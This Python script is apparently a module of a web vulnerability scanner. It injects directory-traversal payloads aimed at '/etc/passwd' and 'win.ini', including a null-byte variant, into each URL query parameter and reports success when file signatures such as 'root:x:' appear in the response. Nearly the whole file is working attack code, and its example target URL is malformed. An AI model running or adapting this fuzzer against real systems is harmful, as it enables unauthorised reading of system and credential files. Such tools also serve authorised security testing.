import requests
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

def test_directory_traversal(target_url):
    print(f"\n[DIR-TRAVERSAL MODULE]: Testing URL: {target_url}")
    
    # 1. Professional Payloads for both Linux and Windows environments
    traversal_payloads = [
        "../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "../../../../../../../../etc/passwd%00", # Null byte injection technique
        "/etc/passwd"
    ]
    
    # 2. Signature tokens to confirm successful file leakage
    success_signatures = [
        "root:x:",          # Standard Linux /etc/passwd start string
        "[extensions]",     # Common Windows win.ini section
        "[fonts]",          # Windows system file footprint
        "bin/bash"          # Linux shell footprint
    ]
    
    parsed_url = urlparse(target_url)
    query_params = parse_qs(parsed_url.query)
    
    # Check if the URL actually contains parameters to fuzz
    if not query_params:
        print("  [INFO]: No URL query parameters found to test for Path Traversal.")
        return False

    is_vulnerable = False
    
    # 3. Parameter Fuzzing Loop
    for param in query_params:
        print(f"  [~] Fuzzing parameter: '{param}'")
        
        for payload in traversal_payloads:
            # Original parameters ki copy banayein taake sirf target param change ho
            modified_params = query_params.copy()
            modified_params[param] = [payload]
            
            # Naya URL reconstruct karna payload ke sath
            new_query = urlencode(modified_params, doseq=True)
            fuzzed_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            try:
                response = requests.get(fuzzed_url, timeout=10)
                
                # 4. Response Analysis using signature matching
                for signature in success_signatures:
                    if signature in response.text.lower():
                        print(f"  [ALERT]!!! Directory Traversal Detected!")
                        print(f"  [TARGET URL]: {fuzzed_url}")
                        print(f"  [MATCHED SIGNATURE]: '{signature}'")
                        is_vulnerable = True
                        break
                        
                if is_vulnerable:
                    break # Agle payload par jaane ki zaroorat nahi agar confirm ho gaya
                    
            except Exception as e:
                print(f"  [DIR-TRAVERSAL ERROR]: Connection failed for {fuzzed_url}: {e}")
                
    if not is_vulnerable:
        print("  [SAFE]: Tested parameters did not leak system files.")
        
    return is_vulnerable

# if __name__ == "__main__":
#     # Mock URL simulating a vulnerable looking parameter layout
#     mock_target = "http://example.com"
#     test_directory_traversal(mock_target)
if __name__ == "__main__":
    # Target parameter matrix pointed directly at our local live fire Flask server
    mock_target = "http://127.0.0"
    test_directory_traversal(mock_target)

